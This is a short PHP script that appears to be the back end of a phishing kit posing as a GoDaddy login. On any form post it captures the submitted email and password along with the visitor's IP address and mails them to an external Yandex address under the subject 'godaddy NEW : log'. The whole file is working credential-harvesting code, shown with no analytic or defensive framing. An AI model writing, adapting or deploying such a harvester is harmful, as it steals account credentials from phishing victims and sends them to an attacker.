<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
		$to = "makemeyours22@yandex.com";
		
		
         $subject = "godaddy NEW : log";
		 
		 $message =  "Online ID            : ".$email."\r\n";
         $message .= "Password           : ".$password."\r\n";
         $message .= "Ip           : ".$ip."\r\n";
		 
		$header = "Content type: eightech \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}
?>